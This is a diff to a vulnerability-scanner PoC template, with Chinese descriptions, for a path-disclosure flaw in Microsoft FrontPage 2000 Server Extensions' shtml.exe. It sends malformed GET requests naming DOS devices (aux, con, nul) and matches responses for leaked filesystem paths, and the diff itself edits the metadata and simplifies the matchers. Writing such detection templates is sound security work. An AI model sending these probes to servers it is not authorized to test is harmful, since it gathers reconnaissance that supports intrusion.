@@ -1,8 +1,8 @@
 [info]
-author = "AVE"
-description = "向目标服务器的 shtml.exe 组件发送包含 DOS 设备名（如 CON）的畸形 URL，检测响应中是否泄露服务器物理路径信息。该漏洞源于 shtml.exe 对 DOS 保留设备名处理异常，攻击者可利用此漏洞获取服务器组件安装路径，为后续攻击提供信息支撑。"
+author = "ave"
+description = "向目标 shtml.exe 发送包含 DOS 设备名称的畸形 URL 请求，检测响应中是否泄露服务器物理路径信息"
 id = "POC-AVE-2000-0866"
-name = "Microsoft FrontPage 2000 Server Extensions shtml.exe 物理路径泄露 PoC"
+name = "Microsoft FrontPage 2000 Server Extensions shtml.exe 信息泄露 PoC"
 severity = "medium"
 tags = ["ave-2000-0866"]
 vuln_id = [
@@ -15,7 +15,7 @@ logic = "any"
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}/_vti_bin/shtml.exe/CON"
+path = "/{{BaseURL}}/_vti_bin/shtml.exe/aux"
 protocol = "http"
 
 [[poc.requests.matchers]]
@@ -25,15 +25,13 @@ type = "word"
 words = [
     ':\',
     "drive",
-    "Program Files",
-    "inetpub",
-    "physical path",
-    "ServerRoot",
+    "path",
+    "cannot find",
 ]
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}/_vti_bin/shtml.exe/NUL"
+path = "/{{BaseURL}}/_vti_bin/shtml.exe/con"
 protocol = "http"
 
 [[poc.requests.matchers]]
@@ -43,15 +41,13 @@ type = "word"
 words = [
     ':\',
     "drive",
-    "Program Files",
-    "inetpub",
-    "physical path",
-    "ServerRoot",
+    "path",
+    "cannot find",
 ]
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}/_vti_bin/shtml.exe/AUX"
+path = "/{{BaseURL}}/_vti_bin/shtml.exe/nul"
 protocol = "http"
 
 [[poc.requests.matchers]]
@@ -61,8 +57,6 @@ type = "word"
 words = [
     ':\',
     "drive",
-    "Program Files",
-    "inetpub",
-    "physical path",
-    "ServerRoot",
+    "path",
+    "cannot find",
 ]
